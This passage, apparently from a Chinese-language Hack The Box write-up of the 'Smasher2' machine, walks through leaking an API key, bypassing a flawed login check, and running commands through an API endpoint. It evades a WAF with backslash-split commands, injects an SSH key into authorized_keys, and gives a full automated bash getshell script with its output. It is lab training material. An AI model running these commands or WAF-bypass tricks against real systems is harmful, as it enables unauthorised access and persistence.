<li><p>发送错误消息时，由于出现垃圾回收错误，指向data_object的指针现在指向secret_token_info，而是显示该信息。</p>
</li>
</ul>
<p>Proxy通过Burp发送，并设置拦截。提交一个明显不正确的用户名和密码0xdf/0xdf：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb7.jpg"></p>
<p>再发送9次。现在，将其更改为数据为具有两个字符串和一个整数的数组。 它们的值是什么无关紧要。 使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;auth&quot;</span>,<span class="string">&quot;data&quot;</span>:[<span class="string">&quot;0xdf&quot;</span>, <span class="string">&quot;string&quot;</span>, 223]&#125;</span><br></pre></td></tr></table></figure>
<p>当我提交时，错误消息中包含泄漏的信息，包括API密钥及其使用方法：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb8.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;authenticated&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;result&quot;</span>:<span class="string">&quot;Cannot authenticate with data: [&#x27;/api/&lt;api_key&gt;/job&#x27;, &#x27;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&#x27;, 1577434053] - Too many tentatives, wait 2 minutes!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法2：利用用户名-密码"><a href="#方法2：利用用户名-密码" class="headerlink" title="方法2：利用用户名==密码"></a>方法2：利用用户名==密码</h3><p>在这里，我查看了检查用户名和密码的代码。 首先，此块加载输入的用户名和密码，然后调用get_internal_usr，并将输入的用户名与结果进行比较：</p>
<p><img src="https://0xdf.gitlab.io/img/1570906220495.png"></p>
<p>如果匹配，则在此处继续，在此调用get_internal_pwd并将用户输入的密码与结果进行比较：</p>
<p><img src="https://0xdf.gitlab.io/img/1570906095855.png"></p>
<p>如果此比较匹配，则返回True。<br>从启动代码中记住登录对象是一个包含两个项目的列表，可能是用户名和密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.join(login)))&#125;)</span><br></pre></td></tr></table></figure>

<p>深入研究get_internal_usr（在Ghidra中查找反编译的代码），看到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">undefined8 get_internal_usr(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (long *)PyObject_GetAttrString(param_1,<span class="string">&quot;user_login&quot;</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,0);</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + -1;         // Py_DECREF</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == 0) &#123;</span><br><span class="line">    (**(code **)(plVar1[1] + 0x30))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用PyObject_GetAttrString来获取user_login对象，该对象是上面带有用户名和密码的列表。 然后在下一行检索列表中的第一项，将其作为字符串处理，并在调用Py_DECREF之后返回。 这就是所期望的。<br>现在，看看get_internal_pwd：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">undefined8 get_internal_pwd(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (long *)PyObject_GetAttrString(param_1,<span class="string">&quot;user_login&quot;</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,0);  // This should be 1, not 0</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + -1;</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == 0) &#123;</span><br><span class="line">    (**(code **)(plVar1[1] + 0x30))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行相同的操作，包括获取列表中的第一项，而不是第二项。 这意味着实际上是根据存储的用户名检查密码的！<br>知道了这一点，我花了几分钟就猜出了Administrator：Administrator的凭据。 这样做时，它将返回API密钥和端点信息：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb9.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;authenticated&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;creation_date&quot;</span>: 1577435021,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>,</span><br><span class="line">        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当得到一个shell时，查看源代码，发现它试图将用户名和密码设置为无法猜测的值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login = [<span class="string">&quot;Administrator&quot;</span>, <span class="string">&quot;SuperSecretAdminPWD123!&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>但是该用户名/密码组合无效，因为从未检查第二项。</p>
<ul>
<li>API执行</li>
</ul>
<p>现在有了api密钥，转到/api。 给的/api路径的代码显示可以运行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">&quot;/api/&lt;key&gt;/job&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def job(key):</span><br><span class="line">    ret = &#123;<span class="string">&quot;success&quot;</span>: None, <span class="string">&quot;result&quot;</span>: None&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> manager.secret_key == key:</span><br><span class="line">        data = request.get_json(silent=True)</span><br><span class="line">        <span class="keyword">if</span> data and <span class="built_in">type</span>(data) == dict:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;schedule&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                out = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, data[<span class="string">&quot;schedule&quot;</span>]])</span><br><span class="line">                ret[<span class="string">&quot;success&quot;</span>] = True</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = out</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Missing schedule parameter.&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">            ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Invalid value provided.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">        ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Invalid token.&quot;</span></span><br><span class="line">    <span class="built_in">return</span> jsonify(ret)</span><br></pre></td></tr></table></figure>

<p>需要发布json数据，并在其中包含一个关键时间表，该值是我要运行的值。<br>还在顶部看到一个会话检查，因此，我还将包括从Burp提取的会话cookie。</p>
<ul>
<li>运行失败</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;id&quot;&#125;&#x27;</span></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don<span class="string">&#x27;t have permission to access /api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job</span></span><br><span class="line"><span class="string">on this server.&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80&lt;/address&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>-s 允许在没有状态栏的情况下传递结果；<br>-H “Cookie: session=eyJp …” 添加会话cookie；<br>-H “Content-Type: application/json” 告诉服务器将POST数据作为json处理；<br>http：//wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job是登录后给出的网址；<br>–data ‘{“schedule”:”id”}’ 是要尝试运行命令ID。</p>
<ul>
<li>存在waf</li>
</ul>
<p>在代码中看不到403禁止访问。 如果密钥不匹配，我应该得到200和json，表示成功为False。 这使我认为可能存在WAF阻止请求。<br>开始使用不同的命令，以了解可以完成的工作。 id很小，但是w呢？ 它返回结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;w&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot; 09:40:47 up  3:24,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>好的，回到id，我可以在字符串中添加一些WAF规则以通过它吗？ 此链接具有一些良好的WAF规则。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb10.jpg"></p>
<p>发现了2种通过WAF执行命令的方法，包括’’和\来分解字符。</p>
<h3 id="得到user-txt"><a href="#得到user-txt" class="headerlink" title="得到user.txt"></a>得到user.txt</h3><p>使用此命令来检查home目录-只有一个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;l\\s /home/&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;dzonerzy\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>帅的掉渣，接下来依法炮制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;l\\s -\\l\\a /home/dzonerzy/&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;total 44\ndrwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17  2019 .\ndrwxr-xr-x 3 root     root     4096 Feb 15  2019 ..\nlrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15  2019 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15  2019 .bash_logout\n-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16  2019 .bashrc\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .cache\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .gnupg\ndrwx------ 5 dzonerzy dzonerzy 4096 Feb 17  2019 .local\n-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15  2019 .profile\n-rw-r--r-- 1 root     root      900 Feb 16  2019 README\ndrwxrwxr-x 4 dzonerzy dzonerzy 4096 Dec 27 08:56 smanager\n-rw-r----- 1 root     dzonerzy   33 Feb 17  2019 user.txt\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>读取user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;ca\\t /home/dzonerzy/user.txt&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;91a13e3*************************\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p><font color="red">为防止有人把flag拿来乱提交，故将flag打码</font></p>
<h3 id="SSH密钥投毒"><a href="#SSH密钥投毒" class="headerlink" title="SSH密钥投毒"></a>SSH密钥投毒</h3><p>我无法通过WAF获得类似我的IP地址的任何信息，所以偶然发现了一些战术。 已经在dzonerzy的主目录中。 将创建一个.ssh目录，然后上传一个密钥。<br>创建目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;mk\\dir /home/dzonerzy/.ss\\h&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>base64加密密钥并将其写入/tmp：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># base64 -w0 /root/.ssh/id_rsa.pub</span></span><br><span class="line">c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=</span><br></pre></td></tr></table></figure>
<p>写入成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;echo \&quot;c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=\&quot; &gt; /tmp/luci&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>现在解码密钥并存储在authorized_keys中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;ba\\se\\64 -\\d /tmp/luci &gt;&gt; /home/dzonerzy/.ss\\h/autho\\rized_k\\eys&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>现在可以连接了，帅炸了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10</span><br><span class="line">dzonerzy@smasher2:~$ id</span><br><span class="line">uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">dzonerzy@smasher2:~$ whoami</span><br><span class="line">dzonerzy</span><br><span class="line">dzonerzy@smasher2:~$</span><br></pre></td></tr></table></figure>

<p>还可以写成一键getshell的脚本如下所示，然后运行，非常的牛批：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cookie=$(curl -s -I  http://wonderfulsessionmanager.smasher2.htb/ | grep <span class="string">&quot;Set-Cookie&quot;</span> | cut -d<span class="string">&#x27;;&#x27;</span> -f1 | cut -d= -f2)</span><br><span class="line">ssh_pub_b64=$(cat /root/.ssh/id_rsa.pub | base64 -w0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload base64 encoded key</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;echo    \&quot;&#x27;</span><span class="variable">$ssh_pub_b64</span><span class="string">&#x27;\&quot; &gt; /tmp/df&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to upload public key to /tmp&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Uploaded base64-encoded public key to /tmp/df&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make .ssh directory</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:         &quot;mk\\dir -\\p /home/dzonerzy/.ss\\h&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to make /home/dzonerzy/.ssh directory&quot;</span>;  <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Created .ssh directory&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode Key</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;base64 -\\d /tmp/df &gt; /home/dzonerzy/.ss\\h/auth\\orized_keys&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to decode key into authorized_keys&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Decoded public key into authorized_keys file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Delete tmp file</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;rm /tmp/df&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to delete encoded key from tmp. Manually rm /tmp/df&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[+] SSH with the following command:\nssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./smasher2.sh </span></span><br><span class="line">[+] Uploaded base64-encoded public key to /tmp/df</span><br><span class="line">[+] Created .ssh directory</span><br><span class="line">[+] Decoded public key into authorized_keys file</span><br><span class="line">[+] SSH with the following <span class="built_in">command</span>:</span><br><span class="line">ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span><br><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10</span><br><span class="line">dzonerzy@smasher2:~$ id</span><br><span class="line">uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">dzonerzy@smasher2:~$ whoami</span><br><span class="line">dzonerzy</span><br><span class="line">dzonerzy@smasher2:~$ </span><br></pre></td></tr></table></figure>

